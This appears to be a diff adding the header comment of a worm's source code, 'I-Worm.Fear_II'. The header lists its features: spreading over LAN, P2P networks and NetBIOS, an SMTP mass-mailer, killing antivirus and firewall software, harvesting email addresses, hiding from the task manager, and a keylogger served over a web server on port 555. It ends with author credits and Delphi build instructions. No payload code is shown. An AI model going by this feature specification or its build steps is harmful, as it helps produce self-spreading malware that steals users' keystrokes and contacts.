@@ -1,0 +1,36 @@
+; Virus Name: I-Worm.Fear_II                                                        
+;-----------------------------------------------------------------------------------
+; Features:                                                                         
+;          - Infect LAN,                                                            
+;          - SMTP Engine,                                                           
+;          - Kill AV/FW,                                                            
+;          - Infect P2P (Kazaa, Edonkey, Morpheus, XoloX, ShareAza, LimeWire,       
+;          - Read email addresses from *.htm *.html *.dbx *.wab *.mbx *.tbb *.mai   
+;                                      *.eml *.mbox,                                
+;          - Get email addresses from Windows Messenger,                            
+;          - Search Email Addresses in Eudora Address Book,                         
+;          - Firewall Bypass,                                                       
+;          - Do not appar in task manager under 95/98/NT/2K/XP,                     
+;          - Encrypted Strings in EXE (Easy Encryption),                            
+;          - Change EXE Size on P2P Network,                                        
+;          - Web-Server (Port:555),                                                 
+;          - Prepend some files in windows dir + prepend all .exe files in shared,  
+;            dirs if they are smaller than 5MB,                                     
+;          - KeyLogger (Keylog file can be download from webserver)                 
+;          - It pack the email attachment and shared file with RAR or ZIP,          
+;            Packed email attachent are password protected,                         
+;          - NetBIOS Spreader 0.3                                                      
+;-----------------------------------------------------------------------------------
+; Big thanks goes to:                                                               
+;          - Aphex, ~LOM~, NiklauS, r-22, SlageHammer, ...                                 
+;-----------------------------------------------------------------------------------
+; Compille:                                                                         
+;          - Set search path in both dpr before compille: 
+;                Project -> Options -> Directories -> Search Path = \%FEAR%\System 
+;                Project -> Options -> Directories -> Search Path = \%FEAR%\Temp
+;          - Please use make.bat to compille it.                                    
+;;                                                                                  
+; Important:                                                                        
+;          - Don't compatible with Delphi 7!! Injection do not working with Delphi 7 
+;            compilled dll files.                                                          
+
